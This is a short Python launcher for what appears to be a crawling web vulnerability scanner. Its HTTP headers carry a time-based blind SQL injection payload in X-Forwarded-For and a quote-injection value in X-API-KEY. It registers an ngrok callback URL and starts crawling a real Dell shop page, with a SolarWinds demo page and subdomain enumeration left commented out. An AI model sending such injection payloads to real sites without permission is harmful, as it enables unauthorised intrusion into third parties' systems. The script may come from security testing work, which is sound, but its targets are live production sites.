from Managers.ThreadManager import ThreadManager

headers = {
    'Cache-Control': 'max-age=0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'X-Forwarded-For': 'XOR(if(1=1,sleep(5),0))OR',
    'X-API-KEY': 'xapikeypoc\'',
}
max_depth = 3
batch_size = 20
download_path = "C:\\Users\\oleksandr oliinyk\\Downloads"
ngrok_url = 'http://c86f-91-196-101-94.ngrok.io/'


def main():
    start_url = "https://www.dell.com/en-us/shop/monitors-monitor-accessories/ac/4009"
    # start_url = "https://oriondemo.solarwinds.com/Orion/SummaryView.aspx?ViewID=1"
    # subdomains = sublist3r.main(domain, 40, f'SublisterResult/{domain}_subdomains.txt', ports=None, silent=False,
    # verbose=False, enable_bruteforce=False, engines=None)

    # CacheManager.clear_all()

    thread_man = ThreadManager(batch_size, download_path, max_depth, headers, ngrok_url)

    # thread_man.run_all()
    thread_man.run_single(start_url)


if __name__ == '__main__':
    main()
